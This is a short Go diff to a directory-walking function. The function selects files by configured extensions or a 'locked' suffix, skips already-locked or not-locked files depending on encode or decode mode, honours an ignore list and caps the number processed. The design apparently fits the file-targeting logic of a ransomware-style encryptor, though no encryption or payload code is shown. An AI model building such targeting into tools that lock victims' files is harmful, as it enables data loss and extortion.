@@ -16,26 +16,34 @@ func walk(startDir string, wg *sync.WaitGroup, fn func(string, bool)) {
 	filter := func(filePath string, args ...any) {
 		defer wg.Done()
 		var proceed bool
+		isEncrypted := strings.HasSuffix(filePath, config.LockedExtension)
 
+		// Only work on config.Extensions or locked.
 		for _, ext := range config.Extensions {
-			if strings.HasSuffix(filePath, ext) || strings.HasSuffix(filePath, config.LockedExtension) {
+			if strings.HasSuffix(filePath, ext) || isEncrypted {
 				proceed = true
 				break
 			}
 		}
 
+		if !c.IsDecode && isEncrypted {
+			debugf("%s already locked, can't encode anymore.\n", filePath)
+			return
+		}
+
+		if c.IsDecode && !isEncrypted {
+			debugf("%s not locked, can't decode anymore.\n", filePath)
+			return
+		}
+
 		for _, dir := range config.IgnoreDirs {
 			if strings.Contains(filepath.Dir(filePath), dir) {
-				proceed = false
-				break
+				return
 			}
 		}
 
 		if proceed && count < config.ProcessMax {
 			atomic.AddInt32(&count, 1)
-
-			isEncrypted := strings.HasSuffix(filePath, config.LockedExtension)
-
 			fn(filePath, isEncrypted)
 		}
 
